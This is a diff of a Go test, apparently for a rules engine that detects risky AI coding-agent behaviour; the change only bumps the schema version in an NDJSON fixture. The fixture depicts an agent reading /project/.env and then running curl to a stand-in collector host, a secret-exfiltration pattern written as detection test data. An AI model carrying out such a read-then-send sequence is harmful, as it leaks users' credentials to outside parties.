@@ -56,8 +56,8 @@ func TestRulesTestSequenceNegativeFixture(t *testing.T) {
 
 func TestRulesTestPathlessArtifactSequenceFailsClosed(t *testing.T) {
 	fixture := filepath.Join(t.TempDir(), "events.ndjson")
-	body := `{"schema_version":"0.2.0","event_id":"p1","source_agent":"claude-code","source_type":"artifact","timestamp":"2026-06-02T10:00:00Z","session_id":"s1","actor":"assistant","event_type":"file.read","file_path":"/project/.env","confidence":"high","evidence":{"artifact_type":"fixture"}}
-{"schema_version":"0.2.0","event_id":"p2","source_agent":"claude-code","source_type":"artifact","timestamp":"2026-06-02T10:05:00Z","session_id":"s1","actor":"assistant","event_type":"command.exec","command":"curl https://collector.example","confidence":"high","evidence":{"artifact_type":"fixture"}}`
+	body := `{"schema_version":"0.3.0","event_id":"p1","source_agent":"claude-code","source_type":"artifact","timestamp":"2026-06-02T10:00:00Z","session_id":"s1","actor":"assistant","event_type":"file.read","file_path":"/project/.env","confidence":"high","evidence":{"artifact_type":"fixture"}}
+{"schema_version":"0.3.0","event_id":"p2","source_agent":"claude-code","source_type":"artifact","timestamp":"2026-06-02T10:05:00Z","session_id":"s1","actor":"assistant","event_type":"command.exec","command":"curl https://collector.example","confidence":"high","evidence":{"artifact_type":"fixture"}}`
 	if err := os.WriteFile(fixture, []byte(body), 0o600); err != nil {
 		t.Fatal(err)
 	}
